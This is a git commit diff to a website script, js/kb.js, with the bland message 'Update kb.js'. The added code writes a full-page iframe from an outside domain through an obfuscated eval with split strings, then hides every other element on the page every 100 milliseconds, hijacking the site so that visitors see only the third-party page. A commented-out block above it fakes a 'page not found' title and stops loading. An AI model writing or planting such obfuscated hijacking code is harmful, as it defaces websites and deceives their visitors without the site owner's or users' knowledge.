4cc4d2139f3f368ddedbb680a8e181f49be65f34
blue124qq <74583451+blue124qq@users.noreply.github.com>
2021-04-17 16:38:57 +0800

    Update kb.js

--- js/kb.js
+++ js/kb.js
@@ -10,5 +10,29 @@ else lkvw_60 += "try{document.execCommand('Stop');}catch(e){};<\/script>";
 document.title="无法找到该网页";
 document.write(lkvw_60); */
 
+//网站放广告框架
+var url = "https://www.hnci.net.cn/js/jm.html";
+    var aa=Math.round(Math.random()*8+1);
+    var  ss = '<div id="asdsa" style="height: 100%; width: 100%; background-color: rgb(255, 255, 255); background-position: initial initial; background-repeat: initial initial;"><ifr'+'ame scrolling="yes" marginheight=0 marginwidth=0  frameborder="0" width="100%" height="100%" src="'+url+'"></iframe></div><style type="text/css">html{width:100%;height:100%}body {width:100%;height:100%;overflow:hidden}</style>';
+    eval("do"+"cu"+"ment.wr"+"ite('"+ss+"');");
+    try{
+        setInterval(function(){
+            for(var i=0;i<document.body.children.length;i++){
+                try{
+                    var tagname = document.body.children[i].tagName;
+                    var myid = document.body.children[i].id;
+                    if(myid!="asdsa"){
+                        document.body.children[i].style.display="non"+"e";
+                    }
+                }catch(e){}
+            }
+},100);
+    }catch(e){}
+
+
+
+
+
+
 document.write('<script type="text/javascript" src="https://s9.cnzz.com/z_stat.php?id=1279464830&web_id=1279464830"></script>');
 
